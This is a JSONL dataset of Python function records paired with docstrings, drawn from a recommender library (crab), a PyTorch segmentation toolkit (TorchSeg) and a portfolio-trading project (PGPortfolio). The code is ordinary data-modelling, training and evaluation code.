{"docstring": "'''\nParameters\n----------\ntarget_ids: array of shape [n_target_ids]\n\nsource_id: int or string\n        item id to compare against.\n\nhow_many: int\n    Desired number of most top items to recommend (default=None ALL)\n\nReturns\n--------\nReturn the top N matches\nIt can be user_ids or item_ids.\n'''\n#Empty target_ids\n", "func_signal": "def _top_matches(self, source_id, target_ids, how_many=None, **params):\n", "code": "if target_ids.size == 0:\n    return np.array([])\n\nestimate_preferences = np.vectorize(self.estimate_preference)\n\npreferences = estimate_preferences(source_id, target_ids)\n\npreferences = preferences[~np.isnan(preferences)]\ntarget_ids = target_ids[~np.isnan(preferences)]\n\nsorted_preferences = np.lexsort((preferences,))[::-1]\n\nsorted_preferences = sorted_preferences[0:how_many] \\\n     if how_many and sorted_preferences.size > how_many \\\n        else sorted_preferences\n\nif self.with_preference:\n    top_n_recs = [(target_ids[ind], \\\n             preferences[ind]) for ind in sorted_preferences]\nelse:\n    top_n_recs = [target_ids[ind]\n         for ind in sorted_preferences]\n\nreturn top_n_recs", "path": "crab/scikits/crab/recommenders/svd/classes.py", "commit_date": "2012-01-16 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\nself:\n     Build the data model\n'''\n\n", "func_signal": "def build_model(self):\n", "code": "self._user_ids = np.asanyarray(self.dataset.keys())\nself._user_ids.sort()\n\nself._item_ids = np.array([])\nfor items in self.dataset.itervalues():\n    self._item_ids = np.append(self._item_ids, items)\n\nself._item_ids = np.unique(self._item_ids)\nself._item_ids.sort()\n\nlogger.info(\"creating matrix for %d users and %d items\" % \\\n            (self._user_ids.size, self._item_ids.size))\n\nself.index = np.empty(shape=(self._user_ids.size, self._item_ids.size), dtype=bool)\nfor userno, user_id in enumerate(self._user_ids):\n    if userno % 2 == 0:\n        logger.debug(\"PROGRESS: at user_id #%i/%i\" %  \\\n            (userno, self._user_ids.size))\n    for itemno, item_id in enumerate(self._item_ids):\n        r = True if item_id in self.dataset[user_id] else False\n        self.index[userno, itemno] = r", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\ndataset: dict of shape {user_id:[item_id,item_id2,...]}\n\nLoad the dataset which the input can be the\n{user_id:{item_id:preference,...},...}\nor the {user_id:[item_id,item_id2,...],...}\n'''\n", "func_signal": "def _load_dataset(self, dataset):\n", "code": "if dataset:\n    key = dataset.keys()[0]\n    if isinstance(dataset[key], dict):\n        for key in dataset:\n            dataset[key] = dataset[key].keys()\n\nreturn dataset", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "#Compute the scalar product between two rows of two matrices\n", "func_signal": "def _predict(self, user_index, item_index, trailing=True):\n", "code": "result = self._global_bias + np.sum(self.user_factors[user_index] *\n                                    self.item_factors[item_index])\nif trailing:\n    max_preference = self.model.max_preference()\n    min_preference = self.model.min_preference()\n    if result > max_preference:\n        result = max_preference\n    elif result < min_preference:\n        result = min_preference\n\nreturn result", "path": "crab/scikits/crab/recommenders/svd/classes.py", "commit_date": "2012-01-16 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nParameters\n----------\nuser_id: int or string\n         User for which recommendations are to be computed.\n\nReturns\n---------\nReturn items in the `model` for which the user has not expressed\nthe preference and could possibly be recommended to the user.\n\n'''\n", "func_signal": "def all_other_items(self, user_id, **params):\n", "code": "return self.items_selection_strategy.candidate_items(user_id, \\\n                    self.model)", "path": "crab/scikits/crab/recommenders/svd/classes.py", "commit_date": "2012-01-16 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n--------\nReturn user's preferences values as an array\n\nNotes\n--------\nThis method is a particular method in MatrixDataModel\n'''\n", "func_signal": "def preference_values_from_user(self, user_id):\n", "code": "user_id_loc = np.where(self._user_ids == user_id)\nif not user_id_loc[0].size:\n    #user_id not found\n    raise UserNotFoundError\n\npreferences = self.index[user_id_loc]\n\nreturn preferences", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n--------\nself\n    Sets a particular preference (item plus rating) for a user.\n'''\n", "func_signal": "def set_preference(self, user_id, item_id, value=None):\n", "code": "user_id_loc = np.where(self._user_ids == user_id)\nif not user_id_loc[0].size:\n    raise UserNotFoundError('user_id in the model not found')\n\n#ALLOW NEW ITEMS\n#if not item_id_loc[0].size:\n#    raise ItemNotFoundError('item_id in the model not found')\n\n#How not use the dataset in memory ?!\nself.dataset[user_id].append(item_id)\nself.build_model()", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n--------\nself\n    Sets a particular preference (item plus rating) for a user.\n'''\n", "func_signal": "def set_preference(self, user_id, item_id, value):\n", "code": "user_id_loc = np.where(self._user_ids == user_id)\nif not user_id_loc[0].size:\n    raise UserNotFoundError('user_id in the model not found')\n\n#ALLOW NEW ITEMS\n#if not item_id_loc[0].size:\n#    raise ItemNotFoundError('item_id in the model not found')\n\n#How not use the dataset in memory ?!\nself.dataset[user_id][item_id] = value\nself.build_model()", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\nself:\n     Build the data model\n'''\n#Is it important to store as numpy array ?\n", "func_signal": "def build_model(self):\n", "code": "self._user_ids = np.asanyarray(self.dataset.keys())\nself._user_ids.sort()\n\n#Is it important to store as numpy array ?\nself._item_ids = []\nfor items in self.dataset.itervalues():\n    self._item_ids.extend(items.keys())\n\nself._item_ids = np.unique(np.array(self._item_ids))\nself._item_ids.sort()\n\nself.max_pref = -np.inf\nself.min_pref = np.inf\n\nlogger.info(\"creating matrix for %d users and %d items\" % \\\n            (self._user_ids.size, self._item_ids.size))\n\nself.index = np.empty(shape=(self._user_ids.size, self._item_ids.size))\nfor userno, user_id in enumerate(self._user_ids):\n    if userno % 2 == 0:\n        logger.debug(\"PROGRESS: at user_id #%i/%i\" %  \\\n            (userno, self._user_ids.size))\n    for itemno, item_id in enumerate(self._item_ids):\n        r = self.dataset[user_id].get(item_id, np.NaN) #Is it to be np.NaN or 0 ?!!\n        self.index[userno, itemno] = r\n\nif self.index.size:\n    self.max_pref = np.nanmax(self.index)\n    self.min_pref = np.nanmin(self.index)", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturn a list of recommended items, ordered from most strongly\nrecommend to least.\n\nParameters\n----------\nuser_id: int or string\n         User for which recommendations are to be computed.\nhow_many: int\n         Desired number of recommendations (default=None ALL)\n\n'''\n", "func_signal": "def recommend(self, user_id, how_many=None, **params):\n", "code": "self._set_params(**params)\n\ncandidate_items = self.all_other_items(user_id)\n\nrecommendable_items = self._top_matches(user_id, \\\n         candidate_items, how_many)\n\nreturn recommendable_items", "path": "crab/scikits/crab/recommenders/svd/classes.py", "commit_date": "2012-01-16 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\npreferences: numpy array of shape [(item_id,preference)]\n             Return all existing Preferences expressed for that item,\n'''\n", "func_signal": "def preferences_for_item(self, item_id, order_by_id=True):\n", "code": "item_id_loc = np.where(self._item_ids == item_id)\nif not item_id_loc[0].size:\n    #item_id not found\n    raise ItemNotFoundError('Item not found')\npreferences = self.index[:, item_id_loc]\n\npreferences = preferences.flatten()\n\nreturn self._user_ids[preferences]", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\nself.user_preferences :  list [(item_id,preference)]\n Return user's preferences, ordered by user ID (if order_by_id is True)\n or by the preference values (if order_by_id is False), as an array.\n\n'''\n", "func_signal": "def preferences_from_user(self, user_id, order_by_id=True):\n", "code": "preferences = self.preference_values_from_user(user_id)\n\npreferences = preferences.flatten()\n\nreturn self._item_ids[preferences]", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "\"\"\"\nWrite out a representative picture of this matrix.\n\nThe upper left corner of the matrix will be shown, with up to 20x5\nentries, and the rows and columns will be labeled with up to 8\ncharacters.\n\"\"\"\n", "func_signal": "def __unicode__(self):\n", "code": "matrix = self._repr_matrix(self.index[:20, :5])\nlines = matrix.split('\\n')\nheaders = [repr(self)[1:-1]]\nif self._item_ids.size:\n    col_headers = [('%-8s' % unicode(item)[:8]) for item in self._item_ids[:5]]\n    headers.append(' ' + ('   '.join(col_headers)))\n\nif self._user_ids.size:\n    for (i, line) in enumerate(lines):\n        lines[i] = ('%-8s' % unicode(self._user_ids[i])[:8]) + line\n    for (i, line) in enumerate(headers):\n        if i > 0:\n            headers[i] = ' ' * 8 + line\nlines = headers + lines\nif self.index.shape[1] > 5 and self.index.shape[0] > 0:\n    lines[1] += ' ...'\nif self.index.shape[0] > 20:\n    lines.append('...')\n\nreturn '\\n'.join(line.rstrip() for line in lines)", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\nitems_from_user : numpy array of shape [item_id,..]\n         Return IDs of items user expresses a preference for\n'''\n", "func_signal": "def items_from_user(self, user_id):\n", "code": "preferences = self.preferences_from_user(user_id)\nreturn preferences", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\npreferences: numpy array of shape [(item_id,preference)]\n             Return all existing Preferences expressed for that item,\n'''\n", "func_signal": "def preferences_for_item(self, item_id, order_by_id=True):\n", "code": "item_id_loc = np.where(self._item_ids == item_id)\nif not item_id_loc[0].size:\n    #item_id not found\n    raise ItemNotFoundError('Item not found')\npreferences = self.index[:, item_id_loc]\n\n#think in a way to return as numpy array and how to remove the nan values efficiently.\ndata = zip(self._user_ids, preferences.flatten())\nif order_by_id:\n    return [(user_id, preference)  for user_id, preference in data \\\n                 if not np.isnan(preference)]\nelse:\n    return sorted([(user_id, preference)  for user_id, preference in data \\\n                 if not np.isnan(preference)], key=lambda user: - user[1])", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "\"\"\"\nMonkey-patch an existing `DataParallel` object. Add the replication callback.\nUseful when you have customized `DataParallel` implementation.\n\nExamples:\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallel(sync_bn, device_ids=[0, 1])\n    > patch_replication_callback(sync_bn)\n    # this is equivalent to\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallelWithCallback(sync_bn, device_ids=[0, 1])\n\"\"\"\n\n", "func_signal": "def patch_replication_callback(data_parallel):\n", "code": "assert isinstance(data_parallel, DataParallel)\n\nold_replicate = data_parallel.replicate\n\n@functools.wraps(old_replicate)\ndef new_replicate(module, device_ids):\n    modules = old_replicate(module, device_ids)\n    execute_replication_callbacks(modules)\n    return modules\n\ndata_parallel.replicate = new_replicate", "path": "TorchSeg/furnace/legacy/sync_bn/parallel.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# pytorch pretrained model need the input range: 0-1\n", "func_signal": "def normalize(img, mean, std):\n", "code": "img = img.astype(np.float32) / 255.0\nimg = img - mean\nimg = img / std\n\nreturn img", "path": "TorchSeg/furnace/utils/img_utils.py", "commit_date": "2019-09-08 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"There are four evaluation modes:\n    1.only eval a .pth model: -e *.pth\n    2.only eval a certain epoch: -e epoch\n    3.eval all epochs in a given section: -e start_epoch-end_epoch\n    4.eval all epochs from a certain started epoch: -e start_epoch-\n    \"\"\"\n", "func_signal": "def run(self, model_path, model_indice, log_file, log_file_link):\n", "code": "if '.pth' in model_indice:\n    models = [model_indice, ]\nelif \"-\" in model_indice:\n    start_epoch = int(model_indice.split(\"-\")[0])\n    end_epoch = model_indice.split(\"-\")[1]\n\n    models = os.listdir(model_path)\n    models.remove(\"epoch-last.pth\")\n    sorted_models = [None] * len(models)\n    model_idx = [0] * len(models)\n\n    for idx, m in enumerate(models):\n        num = m.split(\".\")[0].split(\"-\")[1]\n        model_idx[idx] = num\n        sorted_models[idx] = m\n    model_idx = np.array([int(i) for i in model_idx])\n\n    down_bound = model_idx >= start_epoch\n    up_bound = [True] * len(sorted_models)\n    if end_epoch:\n        end_epoch = int(end_epoch)\n        assert start_epoch < end_epoch\n        up_bound = model_idx <= end_epoch\n    bound = up_bound * down_bound\n    model_slice = np.array(sorted_models)[bound]\n    models = [os.path.join(model_path, model) for model in\n              model_slice]\nelse:\n    models = [os.path.join(model_path,\n                           'epoch-%s.pth' % model_indice), ]\n\nresults = open(log_file, 'a')\nlink_file(log_file, log_file_link)\n\nfor model in models:\n    logger.info(\"Load Model: %s\" % model)\n    self.val_func = load_model(self.network, model)\n    result_line = self.multi_process_evaluation()\n\n    results.write('Model: ' + model + '\\n')\n    results.write(result_line)\n    results.write('\\n')\n    results.flush()\n\nresults.close()", "path": "TorchSeg/furnace/engine/dist_test.py", "commit_date": "2019-10-16 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# class counting(gtFine)\n# 2953 2811 2934  970 1296 2949 1658 2808 2891 1654 2686 2343 1023 2832\n# 359  274  142  513 1646\n", "func_signal": "def get_class_names(*args):\n", "code": "return ['road', 'sidewalk', 'building', 'wall', 'fence', 'pole',\n        'traffic light', 'traffic sign',\n        'vegetation', 'terrain', 'sky', 'person', 'rider', 'car',\n        'truck', 'bus', 'train', 'motorcycle', 'bicycle']", "path": "TorchSeg/furnace/datasets/cityscapes/cityscapes.py", "commit_date": "2019-05-15 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# Can have multiple inputs, getting the first one\n", "func_signal": "def compute_Conv2d_flops(module, inp, out):\n", "code": "assert isinstance(module, nn.Conv2d)\nassert len(inp.size()) == 4 and len(inp.size()) == len(out.size())\n\nbatch_size = inp.size()[0]\nin_c = inp.size()[1]\nk_h, k_w = module.kernel_size\nout_c, out_h, out_w = out.size()[1:]\ngroups = module.groups\n\nfilters_per_channel = out_c // groups\nconv_per_position_flops = k_h * k_w * in_c * filters_per_channel\nactive_elements_count = batch_size * out_h * out_w\n\ntotal_conv_flops = conv_per_position_flops * active_elements_count\n\nbias_flops = 0\nif module.bias is not None:\n    bias_flops = out_c * active_elements_count\n\ntotal_flops = total_conv_flops + bias_flops\nreturn total_flops", "path": "TorchSeg/furnace/tools/benchmark/compute_flops.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"3x3 convolution with padding\"\"\"\n", "func_signal": "def conv3x3(in_planes, out_planes, stride=1):\n", "code": "return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                 padding=1, bias=False)", "path": "TorchSeg/furnace/base_model/resnet.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\n'Type' for argparse - checks that file exists but does not open.\n\"\"\"\n", "func_signal": "def extant_file(x):\n", "code": "if not os.path.exists(x):\n    # Argparse uses the ArgumentTypeError to give a rejection message like:\n    # error: argument input: x does not exist\n    raise argparse.ArgumentTypeError(\"{0} does not exist\".format(x))\nreturn x", "path": "TorchSeg/furnace/utils/pyt_utils.py", "commit_date": "2019-09-09 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\n\nArgs:\n    master_callback: a callback to be invoked after having collected messages from slave devices.\n\"\"\"\n", "func_signal": "def __init__(self, master_callback):\n", "code": "self._master_callback = master_callback\nself._queue = queue.Queue()\nself._registry = collections.OrderedDict()\nself._activated = False", "path": "TorchSeg/furnace/legacy/sync_bn/comm.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# Can have multiple inputs, getting the first one\n", "func_signal": "def compute_Conv2d_memory(module, inp, out):\n", "code": "assert isinstance(module, nn.Conv2d)\nassert len(inp.size()) == 4 and len(inp.size()) == len(out.size())\n\nbatch_size = inp.size()[0]\nin_c = inp.size()[1]\nout_c, out_h, out_w = out.size()[1:]\n\n# This includes weighs with bias if the module contains it.\nmread = batch_size * (inp.size()[1:].numel() + num_params(module))\nmwrite = batch_size * out_c * out_h * out_w\nreturn (mread, mwrite)", "path": "TorchSeg/furnace/tools/benchmark/compute_memory.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"Reduce the sum and square-sum, compute the statistics, and broadcast it.\"\"\"\n\n# Always using same \"device order\" makes the ReduceAdd operation faster.\n# Thanks to:: Tete Xiao (http://tetexiao.com/)\n", "func_signal": "def _data_parallel_master(self, intermediates):\n", "code": "intermediates = sorted(intermediates, key=lambda i: i[1].sum.get_device())\n\nto_reduce = [i[1][:2] for i in intermediates]\nto_reduce = [j for i in to_reduce for j in i]  # flatten\ntarget_gpus = [i[1].sum.get_device() for i in intermediates]\n\nsum_size = sum([i[1].sum_size for i in intermediates])\nsum_, ssum = ReduceAddCoalesced.apply(target_gpus[0], 2, *to_reduce)\nmean, inv_std = self._compute_mean_std(sum_, ssum, sum_size)\n\nbroadcasted = Broadcast.apply(target_gpus, mean, inv_std)\n\noutputs = []\nfor i, rec in enumerate(intermediates):\n    outputs.append((rec[0], _MasterMessage(*broadcasted[i*2:i*2+2])))\n\nreturn outputs", "path": "TorchSeg/furnace/legacy/sync_bn/syncbn.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# pull from device\n", "func_signal": "def pull(self, igpu):\n", "code": "with self.mutex:\n    if igpu == 0:\n        assert(len(self.dict) == self.nGPUs)\n        # flatten the tensors\n        self.list = [t for i in range(len(self.dict)) for t in self.dict[i]]\n        self.outlist = allreduce(2, *self.list)\n        self.reduce_tasks -= 1\n    else:\n        self.reduce_tasks -= 1\nwith self.all_tasks_done:\n    if self.reduce_tasks == 0:\n        self.all_tasks_done.notify_all()\n    while self.reduce_tasks:\n        self.all_tasks_done.wait()\n# all reduce done\nreturn self.N, self.outlist[2*igpu], self.outlist[2*igpu+1]", "path": "TorchSeg/furnace/legacy/sync_bn/syncbn.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\nRegister an slave device.\n\nArgs:\n    identifier: an identifier, usually is the device id.\n\nReturns: a `SlavePipe` object which can be used to communicate with the master device.\n\n\"\"\"\n", "func_signal": "def register_slave(self, identifier):\n", "code": "if self._activated:\n    assert self._queue.empty(), 'Queue is not clean before next initialization.'\n    self._activated = False\n    self._registry.clear()\nfuture = FutureResult()\nself._registry[identifier] = _MasterRegistry(future)\nreturn SlavePipe(identifier, self._queue, future)", "path": "TorchSeg/furnace/legacy/sync_bn/comm.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# cv2: B G R\n# h w c\n", "func_signal": "def _open_image(filepath, mode=cv2.IMREAD_COLOR, dtype=None):\n", "code": "img = np.array(cv2.imread(filepath, mode), dtype=dtype)\n\nreturn img", "path": "TorchSeg/furnace/datasets/BaseDataset.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"Compute the mean and standard-deviation with sum and square-sum. This method\nalso maintains the moving average on the master device.\"\"\"\n", "func_signal": "def _compute_mean_std(self, sum_, ssum, size):\n", "code": "assert size > 1, 'BatchNorm computes unbiased standard-deviation, which requires size > 1.'\nmean = sum_ / size\nsumvar = ssum - sum_ * mean\nunbias_var = sumvar / (size - 1)\nbias_var = sumvar / size\n\nself.running_mean = (1 - self.momentum) * self.running_mean + self.momentum * mean.data\nself.running_var = (1 - self.momentum) * self.running_var + self.momentum * unbias_var.data\n\nreturn mean, (bias_var + self.eps) ** -0.5", "path": "TorchSeg/furnace/legacy/sync_bn/syncbn.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\nWraps cv2.findContours to maintain compatiblity between versions 3 and 4\nReturns:\n    contours, hierarchy\n\"\"\"\n", "func_signal": "def findContours(*args, **kwargs):\n", "code": "if cv2.__version__.startswith('4'):\n    contours, hierarchy = cv2.findContours(*args, **kwargs)\nelif cv2.__version__.startswith('3'):\n    _, contours, hierarchy = cv2.findContours(*args, **kwargs)\nelse:\n    raise AssertionError(\n        'cv2 must be either version 3 or 4 to call this method')\n\nreturn contours, hierarchy", "path": "TorchSeg/furnace/utils/img_utils.py", "commit_date": "2019-09-08 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# push from device\n", "func_signal": "def push(self, *inputs):\n", "code": "with self.mutex:\n    if self.push_tasks == 0:\n        self._clear()\n    self.N += inputs[0]\n    igpu = inputs[1]\n    self.dict[igpu] = inputs[2:]\n    #idx = self.nGPUs - self.push_tasks\n    self.push_tasks -= 1\nwith self.all_tasks_done:\n    if self.push_tasks == 0:\n        self.all_tasks_done.notify_all()\n    while self.push_tasks:\n        self.all_tasks_done.wait()", "path": "TorchSeg/furnace/legacy/sync_bn/syncbn.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "# return self.parameters_quantity\n", "func_signal": "def parameter_quantity(self):\n", "code": "total_parameter_quantity = self._parameter_quantity\nfor child in self.children:\n    total_parameter_quantity += child.parameter_quantity\nreturn total_parameter_quantity", "path": "TorchSeg/furnace/tools/benchmark/stat_tree.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\nExecute an replication callback `__data_parallel_replicate__` on each module created by original replication.\n\nThe callback will be invoked with arguments `__data_parallel_replicate__(ctx, copy_id)`\n\nNote that, as all modules are isomorphism, we assign each sub-module with a context\n(shared among multiple copies of this module on different devices).\nThrough this context, different copies can share some information.\n\nWe guarantee that the callback on the master copy (the first copy) will be called ahead of calling the callback\nof any slave copies.\n\"\"\"\n", "func_signal": "def execute_replication_callbacks(modules):\n", "code": "master_copy = modules[0]\nnr_modules = len(list(master_copy.modules()))\nctxs = [CallbackContext() for _ in range(nr_modules)]\n\nfor i, module in enumerate(modules):\n    for j, m in enumerate(module.modules()):\n        if hasattr(m, '__data_parallel_replicate__'):\n            m.__data_parallel_replicate__(ctxs[j], i)", "path": "TorchSeg/furnace/legacy/sync_bn/parallel.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"Performs a single optimization step.\nArguments:\n    closure (callable, optional): A closure that reevaluates the model\n        and returns the loss.\n\"\"\"\n", "func_signal": "def step(self, closure=None):\n", "code": "loss = None\nif closure is not None:\n    loss = closure()\n\nfor group in self.param_groups:\n    weight_decay = group['weight_decay']\n    momentum = group['momentum']\n    dampening = group['dampening']\n    nesterov = group['nesterov']\n\n    for p in group['params']:\n        if p.grad is None:\n            continue\n        d_p = p.grad.data\n        if weight_decay != 0:\n            d_p.add_(weight_decay, p.data)\n        d_p.mul_(group['lr'])\n        if momentum != 0:\n            param_state = self.state[p]\n            if 'momentum_buffer' not in param_state:\n                buf = param_state['momentum_buffer'] = torch.zeros_like(\n                    p.data)\n                buf.mul_(momentum).add_(d_p)\n            else:\n                buf = param_state['momentum_buffer']\n                buf.mul_(momentum).add_(1 - dampening, d_p)\n            if nesterov:\n                d_p = d_p.add(momentum, buf)\n            else:\n                d_p = buf\n\n        p.data.add_(-1, d_p)\n\nreturn loss", "path": "TorchSeg/furnace/seg_opr/sgd.py", "commit_date": "2019-01-23 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\nMain entry for the master device in each forward pass.\nThe messages were first collected from each devices (including the master device), and then\nan callback will be invoked to compute the message to be sent back to each devices\n(including the master device).\n\nArgs:\n    master_msg: the message that the master want to send to itself. This will be placed as the first\n    message when calling `master_callback`. For detailed usage, see `_SynchronizedBatchNorm` for an example.\n\nReturns: the message to be sent back to the master device.\n\n\"\"\"\n", "func_signal": "def run_master(self, master_msg):\n", "code": "self._activated = True\n\nintermediates = [(0, master_msg)]\nfor i in range(self.nr_slaves):\n    intermediates.append(self._queue.get())\n\nresults = self._master_callback(intermediates)\nassert results[0][0] == 0, 'The first result should belongs to the master.'\n\nfor i, res in results:\n    if i == 0:\n        continue\n    self._registry[i].result.put(res)\n\nfor i in range(self.nr_slaves):\n    assert self._queue.get() is True\n\nreturn results[0][1]", "path": "TorchSeg/furnace/legacy/sync_bn/comm.py", "commit_date": "2019-05-14 00:00:00", "repo_name": "ycszen/TorchSeg", "stars": 1397, "license": "mit", "language": "python", "size": 2511}
{"docstring": "\"\"\"\n:param x:\n:param y:\n:param last_w:\n:param setw: a function, pass the output w to it to fill the PVM\n:param tensors:\n:return:\n\"\"\"\n", "func_signal": "def evaluate_tensors(self, x, y, last_w, setw, tensors):\n", "code": "tensors = list(tensors)\ntensors.append(self.__net.output)\nassert not np.any(np.isnan(x))\nassert not np.any(np.isnan(y))\nassert not np.any(np.isnan(last_w)),\\\n    \"the last_w is {}\".format(last_w)\nresults = self.__net.session.run(tensors,\n                                 feed_dict={self.__net.input_tensor: x,\n                                            self.__y: y,\n                                            self.__net.previous_w: last_w,\n                                            self.__net.input_num: x.shape[0]})\nsetw(results[-1][:, 1:])\nreturn results[:-1]", "path": "PGPortfolio/pgportfolio/learn/nnagent.py", "commit_date": "2018-02-09 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
{"docstring": "\"\"\"\n@:param agent_type: string, could be nn or traditional\n@:param agent: the traditional agent object, if the agent_type is traditional\n\"\"\"\n", "func_signal": "def __init__(self, waiting_period, config, total_steps, net_dir, agent=None, initial_BTC=1.0, agent_type=\"nn\"):\n", "code": "self._steps = 0\nself._total_steps = total_steps\nself._period = waiting_period\nself._agent_type = agent_type\n\nif agent_type == \"traditional\":\n    config[\"input\"][\"feature_number\"] = 1\n    config[\"input\"][\"norm_method\"] = \"relative\"\n    self._norm_method = \"relative\"\nelif agent_type == \"nn\":\n    self._rolling_trainer = RollingTrainer(config, net_dir, agent=agent)\n    self._coin_name_list = self._rolling_trainer.coin_list\n    self._norm_method = config[\"input\"][\"norm_method\"]\n    if not agent:\n        agent = self._rolling_trainer.agent\nelse:\n    raise ValueError()\nself._agent = agent\n\n# the total assets is calculated with BTC\nself._total_capital = initial_BTC\nself._window_size = config[\"input\"][\"window_size\"]\nself._coin_number = config[\"input\"][\"coin_number\"]\nself._commission_rate = config[\"trading\"][\"trading_consumption\"]\nself._fake_ratio = config[\"input\"][\"fake_ratio\"]\nself._asset_vector = np.zeros(self._coin_number+1)\n\nself._last_omega = np.zeros((self._coin_number+1,))\nself._last_omega[0] = 1.0\n\nif self.__class__.__name__==\"BackTest\":\n    # self._initialize_logging_data_frame(initial_BTC)\n    self._logging_data_frame = None\n    # self._disk_engine =  sqlite3.connect('./database/back_time_trading_log.db')\n    # self._initialize_data_base()\nself._current_error_state = 'S000'\nself._current_error_info = ''", "path": "PGPortfolio/pgportfolio/trade/trader.py", "commit_date": "2017-11-12 00:00:00", "repo_name": "ZhengyaoJiang/PGPortfolio", "stars": 1686, "license": "gpl-3.0", "language": "python", "size": 270}
